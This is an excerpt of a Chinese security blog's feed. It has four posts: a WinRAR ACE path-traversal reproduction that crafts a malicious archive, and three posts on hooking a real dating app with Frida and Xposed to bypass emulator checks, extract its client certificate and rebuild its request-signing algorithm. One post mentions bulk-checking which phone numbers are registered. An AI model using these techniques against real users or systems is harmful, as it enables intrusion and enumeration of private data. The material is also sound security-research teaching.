    <content type="html"><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>近日Check Point团队爆出了一个关于WinRAR存在19年的漏洞，用它来可以获得受害者计算机的控制。攻击者只需利用此漏洞构造恶意的压缩文件，当受害者使用WinRAR解压该恶意文件时便会触发漏洞。</p><a id="more"></a><p>该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库<code>UNACEV2.dll</code>所造成的，该动态链接库在 2006 年被编译，没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。而WinRAR解压ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，将恶意文件写入任意目录,甚至可以写入文件至开机启动项，导致代码执行。</p><h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><p>影响软件：</p><p>WinRAR     &lt; 5.70 Beta 1</p><p>Bandizip    &lt; = 6.2.0.0</p><p>好压(2345压缩)    &lt; = 5.9.8.10907</p><p>360压缩    &lt; = 4.0.0.1170</p><p>等等…</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>该漏洞的实现过程：首先新建一个任意文件，然后利用WinACE进行压缩，修改filename来实现目录穿越漏洞，可以将文件解压到任意目录中。</p><p>主要所需工具<a href="https://web.archive.org/web/20170714193504/http:/winace.com:80/" target="_blank" rel="noopener"><code>WinACE</code></a>、010Editor。</p><p>下载WinACE并安装，安装完成后新建一个文本文件，名字任意。</p><p><img src="01.png" alt=""></p><p>然后利用WinACE进行压缩。</p><p><img src="02.png" alt=""></p><p>然后我们下载<a href="https://github.com/droe/acefile/blob/master/acefile.py" target="_blank" rel="noopener">acefile.py</a>脚本。</p><p>使用命令<code>python acefile.py --headers liehu.ace</code>来读取该文件头信息。</p><p><img src="03.png" alt=""></p><p>根据漏洞的描述，问题是出现在filename中的。那主要就看下面的header吧。</p><p>用010Editor打开该文件。</p><p><img src="04.png" alt=""></p><p>需要看选中的部分。对比acefile解析的结果，并明白各个段对应的内容。</p><p><img src="05.png" alt=""></p><p>如果要修改filename，则需要修改上面标注这几处。第一处为0x4e9a(hdr_crc),第二处为0x0044(hdr_size)，第三处为0x0025(filename的长度），以及最后一处为filename。</p><p>修改顺序是由后到前。</p><p>这里修改filename为<code>d:\d:\liehu.txt</code></p><p>长度为15，对应的hex为0x000f</p><p><img src="06.png" alt=""></p><p>然后修改hdr_size，长度为46，对应的hex为0x002E。</p><p><img src="07.png" alt=""></p><p>接下来就是修改hdr_crc了，这里有一个取巧的方法。</p><p>我们再次运行命令<code>python acefile.py --headers liehu.ace</code></p><p>程序中断并提示<code>CorruptedArchiveError: header CRC failed</code></p><p>定位到错误的位置</p><p><img src="08.png" alt=""></p><p>这里<code>ace_crc16(buf)</code>的值就是ace文件0x4e9a对应的值，直接打印出该值并将该位置的值修改即可。</p><p><img src="09.png" alt=""></p><p>对应的值为63232，转换为hex为0xF700。</p><p><img src="10.png" alt=""></p><p>最后文件内容为</p><p><img src="11.png" alt=""></p><p>再次查看，可以正常解析，并看到filename已经修改成功</p><p><img src="12.png" alt=""></p><p>右键解压该文件，则会在D盘生成一个liehu.txt文件。</p><p><img src="13.png" alt=""></p><p>测试文件：</p><p><a href="https://fuping.site/files/liehu.ace">https://fuping.site/files/liehu.ace</a></p><blockquote><p>解压后会在D盘生成一个liehu.txt文件</p></blockquote><p>测试脚本：</p><p><a href="https://github.com/fupinglee/MyPython/blob/master/exploit/WinRAR_exploit/WinRAR_exploit.py" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/blob/master/exploit/WinRAR_exploit/WinRAR_exploit.py</a></p><h2 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h2><p>有两种方式</p><ol><li><p>升级到最新版本，WinRAR 目前版本是 5.70 Beta 1</p></li><li><p>删除UNACEV2.dll文件</p></li></ol><p><img src="14.png" alt=""></p><p>此时再次解压恶意文件会提示如下错误：</p><p><img src="15.png" alt=""></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h2&gt;&lt;p&gt;近日Check Point团队爆出了一个关于WinRAR存在19年的漏洞，用它来可以获得受害者计算机的控制。攻击者只需利用此漏洞构造恶意的压缩文件，当受害者使用WinRAR解压该恶意文件时便会触发漏洞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Exploit" scheme="https://fuping.site/categories/Exploit/"/>
    
    
      <category term="WinRAR漏洞" scheme="https://fuping.site/tags/WinRAR%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>安卓APP测试之双向证书认证</title>
    <link href="https://fuping.site/2019/02/13/SoulAPP-SSL-Bypass/"/>
    <id>https://fuping.site/2019/02/13/SoulAPP-SSL-Bypass/</id>
    <published>2019-02-13T02:21:36.000Z</published>
    <updated>2019-02-20T16:31:43.442Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在《<a href="https://fuping.site/2019/01/25/Frida-Hook-SoulAPP/">安卓APP测试之HOOK大法-Frida篇</a>》文章中有一个双向证书认证没详细说明，经过<strong>孔已己</strong>的提示，现在补充一下。</p><a id="more"></a><h2 id="0x02-双向证书认证与解决方法"><a href="#0x02-双向证书认证与解决方法" class="headerlink" title="0x02 双向证书认证与解决方法"></a>0x02 双向证书认证与解决方法</h2><p>在对soulApp进行抓包的时候，提示<strong><code>网络错误,请检查网络后重试~</code></strong></p><p><img src="01.png" alt=""></p><p>本来以为直接把这个okhttp的证书hook修改成系统默认的即可，就没有详细说明这一部分，结果有网友问双向证书认证这部分是如何处理的，就详细来说明一下如何处理。这里时由于采用了双向证书认证的缘故，所以抓包返回400错误，直接浏览器访问<a href="https://account.soulapp.cn/" target="_blank" rel="noopener">https://account.soulapp.cn/</a> ，也是不行的</p><p><img src="02.png" alt=""></p><p>提示<code>No required SSL certificate was sent.</code>如果要访问成功，就要带上证书。</p><blockquote><p>关于双向证书认证：客户端有自己的密匙，并持有服务端的证书，服务端给客户端发送数据时，需要将服务端的证书发给客户端验证，验证通过才运行发送数据，同样，客户端请求服务器数据时，也需要将自己的证书发给服务端验证，通过才允许执行请求。详细的内容可以参考<a href="https://blog.csdn.net/enweitech/article/details/53813183。" target="_blank" rel="noopener">https://blog.csdn.net/enweitech/article/details/53813183。</a></p></blockquote><p>我们本地来测试一下，简单介绍一下如何搭建双向证书认证环境。</p><h3 id="1-双向证书认证服务器的搭建"><a href="#1-双向证书认证服务器的搭建" class="headerlink" title="1.双向证书认证服务器的搭建"></a>1.双向证书认证服务器的搭建</h3><p><strong>创建一个证书的步骤：</strong> </p><p><strong>（1）生成系统私钥</strong></p><p><strong>（2）生成待签名证书</strong></p><p><strong>（3）生成x509证书, 用CA私钥进行签名</strong></p><blockquote><p>证书的生成过程略。</p></blockquote><p>以tomcat服务器为例。将生成的服务端证书<code>server.p12</code>和客户端信任证书<code>truststore.jks</code>放入conf目录下。修改tomcat下conf/server.xml文件，去掉https的注释。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port&#x3D;&quot;8443&quot; protocol&#x3D;&quot;org.apache.coyote.http11.Http11Protocol&quot;</span><br><span class="line">               maxThreads&#x3D;&quot;150&quot; SSLEnabled&#x3D;&quot;true&quot; scheme&#x3D;&quot;https&quot; secure&#x3D;&quot;true&quot;</span><br><span class="line">               clientAuth&#x3D;&quot;false&quot; sslProtocol&#x3D;&quot;TLS&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port&#x3D;&quot;8443&quot; protocol&#x3D;&quot;org.apache.coyote.http11.Http11Protocol&quot;</span><br><span class="line">truststoreFile&#x3D;&quot;conf&#x2F;truststore.jks&quot; truststorePass&#x3D;&quot;123456&quot; truststoreType&#x3D;&quot;JKS&quot;</span><br><span class="line">    keystoreFile&#x3D;&quot;conf&#x2F;server.p12&quot; keystorePass&#x3D;&quot;123456&quot; keystoreType&#x3D;&quot;PKCS12&quot; </span><br><span class="line">    maxThreads&#x3D;&quot;150&quot; SSLEnabled&#x3D;&quot;true&quot; scheme&#x3D;&quot;https&quot; secure&#x3D;&quot;true&quot;</span><br><span class="line">    clientAuth&#x3D;&quot;false&quot; sslProtocol&#x3D;&quot;TLS&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>此时<code>clientAuth=&quot;false&quot;</code>，未开启客户端校验。</p></blockquote><p>启动服务器并访问。</p><p><img src="03.png" alt=""></p><p>虽然提示错误但是点继续前往即可访问。</p><p><img src="04.png" alt=""></p><p>设置开启客户端校验，即<code>clientAuth=&quot;true&quot;</code></p><p>然后重启后访问</p><p><img src="05.png" alt=""></p><p>无法正常访问，想要正常访问，浏览器导入证书即可</p><p><img src="06.png" alt=""></p><p>下一步然后输入密码</p><p><img src="07.png" alt=""></p><p>刷新页面，提示选择证书。</p><p><img src="08.png" alt=""></p><p>确定后即可访问。</p><h3 id="2-soulAPP双向认证解决方法"><a href="#2-soulAPP双向认证解决方法" class="headerlink" title="2.soulAPP双向认证解决方法"></a>2.soulAPP双向认证解决方法</h3><p>同理这里soulApp也可以这样做。</p><p>这里列举三种方法来完成客户端的验证。归根结底都是证书的利用。</p><h4 id="a-浏览器导入证书"><a href="#a-浏览器导入证书" class="headerlink" title="a)浏览器导入证书"></a>a)浏览器导入证书</h4><p>利用soulApp中的证书和密码生成浏览器证书。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -inkey client.key -in client.crt -out soulclient.pfx</span><br></pre></td></tr></table></figure><blockquote><p>证书的位置位于资源文件assets中。</p></blockquote><p><img src="09.png" alt=""></p><blockquote><p>标记的1处输入的是soul证书的密码，2和3为证书导入浏览器自己设置的密码，这里为123456</p></blockquote><p>然后导入浏览器，重新访问<a href="https://account.soulapp.cn/" target="_blank" rel="noopener">https://account.soulapp.cn/</a></p><p><img src="10.png" alt=""></p><p>选择证书后确定。</p><p><img src="https://i.imgur.com/63SKzUi.png" alt=""></p><p>根据页面显示内容可以发现此时导入证书后可以正常访问。</p><h4 id="b-利用程序完成认证"><a href="#b-利用程序完成认证" class="headerlink" title="b)利用程序完成认证"></a>b)利用程序完成认证</h4><p>利用程序的话，参考<code>cn.soulapp.android.api.e.a()</code>方法，进行证书的操作。</p><p><img src="11.png" alt=""></p><p>精简之后主要代码如下：</p><p><img src="12.png" alt=""></p><p>然后利用httpclient进行http请求。</p><p>当访问不加证书的效果：</p><p><img src="13.png" alt=""></p><p>使用证书的结果：</p><p><img src="14.png" alt=""></p><blockquote><p>由于这是这是之前的数据包，所以已经过期，再次使用需要更换时间戳和签名，但结果成功的。</p></blockquote><h4 id="c-利用抓包工具"><a href="#c-利用抓包工具" class="headerlink" title="c)利用抓包工具"></a>c)利用抓包工具</h4><p>使用抓包工具，这里以burp为例。</p><p>未导入证书抓包结果：</p><p><img src="15.png" alt=""></p><p>提示400错误，我们在burp中导入证书</p><p><img src="16.png" alt=""></p><p>选择证书并输入密码。</p><p><img src="17.png" alt=""></p><p>证书导入成功。</p><p><img src="18.png" alt=""></p><p>再次抓包</p><p><img src="19.png" alt=""></p><p>已经可以正常抓取了。</p><p>当然使用其他方法也是可行的，这里就不再列举了。</p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>本文主要是为了解决APP与服务器之间的双向证书认证问题，没有太多的技巧，主要就是证书的使用。如果服务器采用了双向认证，那么一般在APP中有证书和证书密码的存在，找到之后导入抓包工具即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;在《&lt;a href=&quot;https://fuping.site/2019/01/25/Frida-Hook-SoulAPP/&quot;&gt;安卓APP测试之HOOK大法-Frida篇&lt;/a&gt;》文章中有一个双向证书认证没详细说明，经过&lt;strong&gt;孔已己&lt;/strong&gt;的提示，现在补充一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android技术" scheme="https://fuping.site/categories/Android%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="SoulAPP" scheme="https://fuping.site/tags/SoulAPP/"/>
    
      <category term="双向证书" scheme="https://fuping.site/tags/%E5%8F%8C%E5%90%91%E8%AF%81%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>安卓APP测试之HOOK大法-Xposed篇</title>
    <link href="https://fuping.site/2019/01/28/Xposed-Hook-SoulApp/"/>
    <id>https://fuping.site/2019/01/28/Xposed-Hook-SoulApp/</id>
    <published>2019-01-28T09:21:56.000Z</published>
    <updated>2019-01-29T02:03:00.394Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p><a href="https://fuping.site/2019/01/25/Frida-Hook-SoulAPP/">安卓APP测试之HOOK大法-Frida篇</a>是基于Frida来实现HOOK，对于部分用户来说，一方面手机ROOT会带来一些风险，另一方面虽然愿意承担风险但是手机无法ROOT。这就需要采用另外一种方法–利用Xposed来进行HOOK。安装VirtualXposed之后，并不需要对手机进行ROOT，也可以来运行Xposed模块进行HOOK。</p><a id="more"></a><p><a href="https://github.com/android-hacker/VirtualXposed" target="_blank" rel="noopener">VirtualXposed</a>是基于<a href="https://github.com/asLody/VirtualApp" target="_blank" rel="noopener">VirtualApp</a> 和 <a href="https://github.com/tiann/epic" target="_blank" rel="noopener">epic</a> 在<strong>非ROOT</strong>环境下运行Xposed模块的实现（支持5.0~9.0)，就像它的介绍那样，<code>Use Xposed with a simple APP, without needing to root, unlock the bootloader, or flash a system image.</code>可以运行Xposed，不需要root，也不需要BL解锁和刷机。</p><h2 id="0x02-环境准备"><a href="#0x02-环境准备" class="headerlink" title="0x02 环境准备"></a>0x02 环境准备</h2><p>手机还是采用魅族Mx4，关闭ROOT权限。</p><p><img src="01.png" alt=""></p><p><img src="02.png" alt=""></p><p>下载并安装VirtualXposed，下载地址：<a href="https://github.com/android-hacker/VirtualXposed/releases" target="_blank" rel="noopener">https://github.com/android-hacker/VirtualXposed/releases</a></p><p>安装：</p><p><code>adb install VirtualXposed_0.16.1.apk</code></p><p>安装VirtualXposed之后，然后把手机上的APP安装到VirtualXposed上。</p><p><img src="03.png" alt=""></p><blockquote><p>由于VirtualXposed自带Xposed，这里我们只将需要的APP安装上去即可。</p></blockquote><p>开发Xposed模块采用的是Android Studio。</p><p>新建一个APP项目，添加依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">provided &#39;de.robv.android.xposed:api:82&#39;</span><br><span class="line">provided &#39;de.robv.android.xposed:api:82:sources&#39;</span><br></pre></td></tr></table></figure><p><img src="04.png" alt=""></p><p>新建一个Main类，并实现<code>IXposedHookLoadPackage</code>接口。</p><p><img src="05.png" alt=""></p><p>在src/main下新建一个<code>Assets Folder</code>。</p><p><img src="06.png" alt=""></p><p>并在其中新建一个名称为<code>xposed_init</code>的文件，内容是实现HOOK的类，这里是<code>com.fuping.soulhook.Main</code>。</p><p>在AndroidManifest.xml中指定模块的名称</p><p><img src="07.png" alt=""></p><p>环境准备好了，下面就是模块的开发和HOOK了。</p><h2 id="0x03-利用Xposed进行HOOK"><a href="#0x03-利用Xposed进行HOOK" class="headerlink" title="0x03 利用Xposed进行HOOK"></a>0x03 利用Xposed进行HOOK</h2><p>由于上篇文章已经分析过了，这里就不进行分析了，打开app会提示<code>SoulApp 暂不支持模拟器，请稍后再试~</code>。我们需要对<code>cn.soulapp.android.utils.j.e()</code>进行HOOK，令其返回为false。</p><p>上面模块的框架已经搭好了，直接写HOOK代码，主要代码如下：</p><p><img src="08.png" alt=""></p><blockquote><p>注意，利用Android Studio进行模块的编写时，需要禁用<code>Instant Run</code>(<code>File -&gt; Settings -&gt; Build, Execution, Deployment -&gt; Instant Run</code>)。</p></blockquote><p>然后打包安装。再利用VirtualXposed将编写的HOOK模块添加到VirtualXposed中。</p><p><img src="09.png" alt=""></p><p>查看安装的app</p><p><img src="10.png" alt=""></p><p>然后在VirtualXposed中打开Xposed Installer，在模块中勾选soulHook。</p><p><img src="11.png" alt=""></p><p>重启VirtualXposed。</p><blockquote><p>Xposed模块每次修改都需要重启手机，在VirtualXposed中时，只需重启VirtualXposed即可，而且速度极快。</p></blockquote><p>在VirtualXposed中打开soulapp，并查看logcat输出内容。</p><p><img src="12.png" alt=""></p><p>APP可以正常进入，说明HOOK成功。</p><p>剩下的也比较简单了，例如查看<code>com.gongjiao.rr.tools.f.b</code>参数。</p><p>主要代码：</p><p><img src="13.png" alt=""></p><p>运行输入手机号查看Log信息：</p><p><img src="14.png" alt=""></p><p>也是毫无问题可以获取到参数的内容的。</p><p>获取到参数内容后，根据上篇文章的算法的分析，就可以自己构造进行加密了。</p><p>例如利用Python来实现，可以批量探测用户是否注册。</p><p><img src="15.png" alt=""></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>本来Frida和Xposed是作为一篇文章的，但是由于篇幅问题分成了两篇。这两篇文章主要通过两种方式来进行HOOK，主要是为了说明HOOK的好处，没有说是为了对比哪个好哪个不好的。不过通过测试，如果安装了VirtualXposed，Xposed应该还是略胜一筹吧。第一点无需ROOT即可运行，第二点是解决了需要重启手机的麻烦（利用VirtualXposed可以秒重启），第三点就是携带方便了。不过各有各的好处，根据自己的习惯选择。也可以先用Frida进行HOOK，毕竟测试比较方便，然后最后移植到Xposed上。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://fuping.site/2019/01/25/Frida-Hook-SoulAPP/&quot;&gt;安卓APP测试之HOOK大法-Frida篇&lt;/a&gt;是基于Frida来实现HOOK，对于部分用户来说，一方面手机ROOT会带来一些风险，另一方面虽然愿意承担风险但是手机无法ROOT。这就需要采用另外一种方法–利用Xposed来进行HOOK。安装VirtualXposed之后，并不需要对手机进行ROOT，也可以来运行Xposed模块进行HOOK。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android技术" scheme="https://fuping.site/categories/Android%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="安卓Hook" scheme="https://fuping.site/tags/%E5%AE%89%E5%8D%93Hook/"/>
    
      <category term="SoulAPP" scheme="https://fuping.site/tags/SoulAPP/"/>
    
      <category term="Xposed" scheme="https://fuping.site/tags/Xposed/"/>
    
  </entry>
  
  <entry>
    <title>安卓APP测试之HOOK大法-Frida篇</title>
    <link href="https://fuping.site/2019/01/25/Frida-Hook-SoulAPP/"/>
    <id>https://fuping.site/2019/01/25/Frida-Hook-SoulAPP/</id>
    <published>2019-01-25T14:17:11.000Z</published>
    <updated>2019-01-28T09:25:42.442Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>一般测试APP都是先设置代理，然后抓包进行测试。但是大多数情况下，抓取的数据包都含有参数校验，一旦修改其中一个参数之后，就会返回签名错误。</p><a id="more"></a><p>例如：</p><p><img src="01.png" alt=""></p><p>还有的有时间校验，当过去某一时间段后，该数据包就失效了。</p><p><img src="02.png" alt=""></p><p>因此如果想要去重放或者修改数据包进行FUZZ的话，就要弄清楚其中的加密sign值的算法。</p><p>本文以某app老版本为例(仅为技术研究)，主要目的是利用Frida进行HOOK进而去获取其api-sign的加密算法。</p><h2 id="0x02-环境准备"><a href="#0x02-环境准备" class="headerlink" title="0x02 环境准备"></a>0x02 环境准备</h2><p>这里手机采用魅族X4，刷了CM13.0，开启ROOT权限。</p><p>APP版本为v3.0.10，下载地址：<a href="https://www.wandoujia.com/apps/cn.soulapp.android/history_v18080100" target="_blank" rel="noopener">https://www.wandoujia.com/apps/cn.soulapp.android/history_v18080100</a></p><p>然后就是Frida环境的准备了。</p><p><strong>Frida</strong>是一款基于Python + JavaScript 的Hook与调试框架，在Android\Linux\Windows等平台均能使用。这里我们以<strong>Windows</strong>来对Android应用程序进行Hook。Frida的官网地址是：<a href="https://www.frida.re/" target="_blank" rel="noopener">https://www.frida.re。</a></p><p>安装方法也很简单：<code>pip install frida-tools</code>。</p><p>手机开启开发者模式，并开启USB调试。</p><p>下载frida-server，下载地址为：<a href="http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。" target="_blank" rel="noopener">http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。</a></p><p>上传到手机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server /data/<span class="built_in">local</span>/tmp/</span><br></pre></td></tr></table></figure><p>添加权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@mx4:/ <span class="comment">#chmod 777 frida-server</span></span><br></pre></td></tr></table></figure><p>手机上运行frida-server，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@mx4:&#x2F; #.&#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server</span><br></pre></td></tr></table></figure><p>端口转发,电脑上运行如下命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br></pre></td></tr></table></figure><p>环境准备好了，就开始对APP进行测试。</p><h2 id="0x03-利用Frida进行HOOK"><a href="#0x03-利用Frida进行HOOK" class="headerlink" title="0x03 利用Frida进行HOOK"></a>0x03 利用Frida进行HOOK</h2><p>安装后打开APP。</p><p><img src="03.png" alt=""></p><p>发现APP闪退，并提示<code>SoulApp 暂不支持模拟器，请稍后再试~</code>。</p><p>用jadx打开apk文件，搜索关键字<code>模拟器</code>。</p><p><img src="04.png" alt=""></p><p>只有一处，我们点进去。</p><p><img src="05.png" alt=""></p><p>其中有个判断，如果<code>cn.soulapp.android.utils.j.e()</code>为true，则提示不支持模拟器，并退出程序。点进这个方法查看。</p><p><img src="06.png" alt=""></p><p>其中有多个判断，如果一个为true，则返回true，最简单有效的方法就是hook，直接令其返回为false。使用Frida进行hook，代码如下：</p><p><img src="07.png" alt=""></p><p>运行后，发现再次打开app，可以顺利进入了。</p><p><img src="08.png" alt=""></p><p>输入手机号，点击确定。</p><p><img src="09.png" alt=""></p><p>提示<code>网络错误</code>，这是因为使用了代理，所以报错，但是有数据包的。可以暂时先不管这里。我们目的是获取sign值的加密算法。这里是获取api-sign的加密算法。</p><p>数据包内容</p><p><img src="10.png" alt=""></p><p>数据包中有<code>api-sign</code>，所以直接利用jadx搜索<code>api-sign</code>。</p><p><img src="11.png" alt=""></p><p>发现在cn.soulapp.android.api.b.b.b()中有调用，进入查看。</p><p><img src="12.png" alt=""></p><p>api-sign值的获取调用了<code>cn.soulapp.android.api.b.c.a</code>方法。</p><p><img src="13.png" alt=""></p><p>这里是创建了一个stringBuilder，经过拼接后，调用com.gongjiao.rr.tools.f.b进行sha1加密，并转换为大写。我们需要知道cn.soulapp.android.api.b.c.a三个参数的值是什么。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aVar.b(<span class="string">"api-sign"</span>, c.a(aaVar, replaceAll, currentTimeMillis));</span><br></pre></td></tr></table></figure><p>根据代码可以推测，第一个参数<code>aaVar</code>是类<code>okhttp3.Request</code>的实例化；</p><p>第二个参数<code>replaceAll</code>是获取的UUID去除中间的<code>&quot;-&quot;</code>；</p><p>第三个参数是当前时间戳减去<code>cn.soulapp.android.api.a.a()</code>。这个值是从<code>soul_share.xml</code>中读取<code>ApiConstants_timeDiff</code>的值，查看<code>soul_share.xml</code>发现内容为空。</p><p><img src="14.png" alt=""></p><p>所以第三个参数为当前的时间戳。</p><p>查看<code>cn.soulapp.android.api.b.c.a</code>方法，前半部分是对<code>aaVar</code>进行操作，大概是获取请求的路径，然后对参数进行拼接。</p><p>看后半部分的代码：</p><p><img src="15.png" alt=""></p><p>这里第71行中的<code>UTDevice.getUtdid(SoulApp.b())</code>为设备号，即数据包里面的<code>device-id</code>；</p><p>第72行的a.j为固定值，这里为10000003；</p><p>第73行这个值需要获取，可以用hook获取；</p><p>第74行a(j)是将传入的时间戳(第三个参数)进行转换；</p><p>第75行是拼接了传入的第二个参数；</p><p>第78行拼接了固定值3010；</p><p>然后第80行调用com.gongjiao.rr.tools.f.b对stringBuilder进行加密，并转换为大写。</p><p>可以通过hook的方法直接获取<code>cn.soulapp.android.api.b.c.a</code>和<code>com.gongjiao.rr.tools.f.b</code>的参数。</p><p>主要代码：</p><p><img src="16.png" alt=""></p><blockquote><p>由于<code>cn.soulapp.android.api.b.c</code>中有多个a方法，所以这里用了重载，指明参数类型来确定是哪个方法。</p></blockquote><p>运行效果</p><p><img src="17.png" alt=""></p><p>知道了加密算法以及参数，就可以自己实现加密获取api-sign了，如下所示：</p><p><img src="18.png" alt=""></p><p>api-sign值可以获取了，我们试一下能否利用。由上面知道代理抓包时数据包返回400，经过查看代码是可以解决这个问题的。这里不详细说明。</p><p><img src="19.png" alt=""></p><p>发现该方法获取api-sign是可行的。</p><h2 id="0x04-其他问题"><a href="#0x04-其他问题" class="headerlink" title="0x04 其他问题"></a>0x04 其他问题</h2><h3 id="1-不进行hook获取参数的内容或者查看调用堆栈的方法"><a href="#1-不进行hook获取参数的内容或者查看调用堆栈的方法" class="headerlink" title="1.不进行hook获取参数的内容或者查看调用堆栈的方法"></a>1.不进行hook获取参数的内容或者查看调用堆栈的方法</h3><p>可以通过动态调试的方法进行查看。</p><p>首先将apk反编译为smali文件，然后IDEA安装smalidea插件。下载地址：<a href="https://bitbucket.org/JesusFreke/smali/downloads/" target="_blank" rel="noopener">https://bitbucket.org/JesusFreke/smali/downloads/</a></p><p>反编译的命令如下：</p><p><code>java -jar baksmali-2.2.2.jar d 106_3ce8a91b116f3ca28175affa3d12083f.apk -o SoulApp3010/src</code></p><p>然后导入到idea中</p><p><img src="20.png" alt=""></p><p>然后在需要查看的地方下断点。</p><p>例如在<code>cn.soulapp.android.api.b.c.a</code>下断点</p><p><img src="21.png" alt=""></p><p>打开Run/Debug Configurations，添加一个远程调试，端口8700</p><p>运行app，然后在Android Device Monitor中选中</p><p><img src="22.png" alt=""></p><p>打开调试按钮，点击手机上的确定，进入调试。</p><p><img src="23.png" alt=""></p><h3 id="2-加密的算法在so文件中"><a href="#2-加密的算法在so文件中" class="headerlink" title="2.加密的算法在so文件中"></a>2.加密的算法在so文件中</h3><p>简单的方法就是获取调用so中方法的参数，然后自己写一个app，调用其so文件。</p><p>如果有判断的话，可以修改so文件达到可以调用的目的。</p><p><img src="24.png" alt=""></p><p>如上所示，该so文件有判断，如果isInMyAPP为false，则会退出，返回null。</p><p>我们可以修改<code>CMP R0,#0</code>为<code>CMP R0,#1</code>来绕过该限制。</p><p>修改后</p><p><img src="25.png" alt=""></p><p>更深入的就是对so文件进行分析，找到其中的加密算法。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>Frida不仅可以用于hook java层，也可以进行native层的hook。利用Frida进行hook时，要求需要使用已ROOT的手机，对于手机无法ROOT的，安装<a href="https://github.com/android-hacker/VirtualXposed" target="_blank" rel="noopener">VirtualXposed</a>后使用Xposed框架也可以进行HOOK。这里就不说明了，有兴趣的可以去试一试。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;一般测试APP都是先设置代理，然后抓包进行测试。但是大多数情况下，抓取的数据包都含有参数校验，一旦修改其中一个参数之后，就会返回签名错误。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android技术" scheme="https://fuping.site/categories/Android%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="安卓Hook" scheme="https://fuping.site/tags/%E5%AE%89%E5%8D%93Hook/"/>
    
      <category term="Frida" scheme="https://fuping.site/tags/Frida/"/>
    
      <category term="SoulAPP" scheme="https://fuping.site/tags/SoulAPP/"/>
    
  </entry>
  
  <entry>
